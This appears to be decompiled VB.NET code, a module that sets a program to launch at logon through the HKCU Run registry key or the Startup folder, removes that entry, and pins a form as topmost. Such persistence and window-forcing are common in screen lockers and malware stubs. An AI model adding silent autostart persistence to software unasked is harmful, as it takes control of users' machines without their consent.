Imports System
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Windows.Forms
Imports Microsoft.Win32

Namespace Main.Tools
	' Token: 0x02000063 RID: 99
	Friend Module Windows
		' Token: 0x060001ED RID: 493 RVA: 0x00011C2C File Offset: 0x0000FE2C
		Friend Sub SetStartup(startupMethod As Windows.StartupMethodType)
			If startupMethod <> Windows.StartupMethodType.StartupFolder Then
				If startupMethod <> Windows.StartupMethodType.Registry Then
					Return
				End If
				Try
					Windows.SetStartupRegistry(Config.FinalExePath)
					Return
				Catch
					Windows.SetStartupFolder()
					Return
				End Try
			End If
			Windows.SetStartupFolder()
		End Sub

		' Token: 0x060001EE RID: 494 RVA: 0x00011C70 File Offset: 0x0000FE70
		Private Sub SetStartupFolder()
			If Config.FinalExeRelativePath <> Nothing Then
				Dim text As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileName(Config.FinalExeRelativePath))
				Config.FinalExePath = text
			End If
		End Sub

		' Token: 0x060001EF RID: 495 RVA: 0x00011CA4 File Offset: 0x0000FEA4
		Private Sub SetStartupRegistry(exePath As String)
			Dim registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
			If registryKey IsNot Nothing Then
				registryKey.SetValue(Path.GetFileName(exePath), exePath)
			End If
		End Sub

		' Token: 0x060001F0 RID: 496 RVA: 0x00011CD8 File Offset: 0x0000FED8
		Friend Sub RemoveStartupRegistry(exePath As String)
			Dim registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
			If registryKey IsNot Nothing Then
				registryKey.DeleteValue(Path.GetFileName(exePath), False)
			End If
		End Sub

		' Token: 0x060001F1 RID: 497
		Private Declare Function SetWindowPos Lib "user32.dll" (hWnd As IntPtr, hWndInsertAfter As IntPtr, X As Integer, Y As Integer, cx As Integer, cy As Integer, uFlags As UInteger) As Boolean

		' Token: 0x060001F2 RID: 498 RVA: 0x00002B03 File Offset: 0x00000D03
		Friend Sub MakeTopMost(f As Form)
			Windows.SetWindowPos(f.Handle, Windows.HWND_TOPMOST, 0, 0, 0, 0, 3UI)
		End Sub

		' Token: 0x040001AE RID: 430
		Private Const SWP_NOSIZE As UInteger = 1UI

		' Token: 0x040001AF RID: 431
		Private Const SWP_NOMOVE As UInteger = 2UI

		' Token: 0x040001B0 RID: 432
		Private HWND_TOPMOST As IntPtr = New IntPtr(-1)

		' Token: 0x02000064 RID: 100
		Friend Enum StartupMethodType
			' Token: 0x040001B2 RID: 434
			StartupFolder
			' Token: 0x040001B3 RID: 435
			Registry
		End Enum
	End Module
End Namespace
